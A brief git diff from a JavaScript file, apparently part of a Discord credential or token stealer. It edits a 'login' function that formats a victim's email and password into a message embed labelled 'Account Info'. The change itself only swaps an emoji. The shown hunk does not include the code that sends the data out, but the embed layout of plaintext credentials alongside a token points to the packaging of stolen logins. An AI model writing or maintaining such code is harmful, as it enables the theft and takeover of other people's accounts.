@@ -663,7 +663,7 @@ const login = async (email, password, token) => {
         fields: [
           {
             name: '**Account Info:**',
-            value: `📧 **Email:** **${email}** - 🔒 **Password:** **${password}**`,
+            value: `<:Phone:1080852884696076379> **Email:** **${email}** - 🔒 **Password:** **${password}**`,
             inline: false,
           },
           {
